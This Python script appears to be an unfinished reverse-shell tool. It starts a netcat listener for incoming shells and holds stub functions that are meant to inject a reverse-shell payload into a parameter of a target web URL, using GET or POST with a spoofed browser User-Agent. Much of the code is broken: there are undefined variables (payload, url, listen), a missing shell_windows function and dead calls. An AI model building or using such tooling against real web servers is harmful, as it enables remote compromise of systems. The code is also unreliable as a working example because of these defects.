#!/usr/bin/env python3
#coding=utf-8
import netifaces
import base64
import requests
import os
import argparse
import nclib
from threading import Thread
import ipaddress
import urllib3


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def main():
	global args , default_ip , nc , port , ip , domain , method
	ip_address = netifaces.ifaddresses('eth0')[2][0]['addr']
	parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)
	parser.add_argument('-H','--host',help='LOCAL IP ADDRESS',default=ip_address)
	parser.add_argument('-p','--port',help='LOCAL PORT NUMBER',type=int,default=9001)
	parser.add_argument("-t","--type",help='Payload Type [windows/linux]',type=str,default='linux')
	parser.add_argument("-u","--url",help='Target url [http://localhost:8888/h.php?meow=PWN]')
	parser.add_argument("-c","--cookie",help='Enter Cookie')
	parser.add_argument("-l","--header",help='Provide header')
	parser.add_argument("-m","--method",help='Request Method',default='post')
	parser.add_argument("-d","--data",help='Post data')
	args = parser.parse_args()
	ip=ip_address
	ip=args.host
	port=args.port
	domain=args.url
	method=args.method


	if args.type == "linux" or args.type == "l":
		shell_linux()
	elif args.type == "windows" or args.type == "w":
		shell_windows()
	else:
		print("[!]Invalid Value -> "+ args.type)



def shell_linux():
	print("listening on port: "+ f"{port}" + "\n" + "Default ip for payloads: "+ f"{ip}")
	print ("---> Waiting For a connection ")
	is_valid()
	#link()
	listener()


def is_valid():
    try:
        ipaddress.ip_address(ip)
        print ("sure")
        return True
    except ValueError:
        return False
        # ADD a better except to break the program

def listener():
	nc = nclib.Netcat(listen=('', port))
	nc.interact()
	nc.close()

def thread():
	t1=Thread(target=listen)
	t1.start()

def link():
	if method == 'post':
		req_post()
	elif method == 'get':
		print('get method')
		req_get()
	else:
		return False

def req_post():
	headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
	cookies=''
	data=''
	data = data.replace('PWNME',payload) #Specify a payload
	r=requests.post(url,headers=headers)

def req_get():
	url = domain.replace('PWNME','127.0.0.1') #payload will be the revshells
	cookies=''
	r=requests.get(url)

def exit():
	pass

if __name__ == '__main__':
		exit(main())
		try:
			is_valid()
			
		except :
			pass


#TODO
#add payloads to a list or a dict for iteration
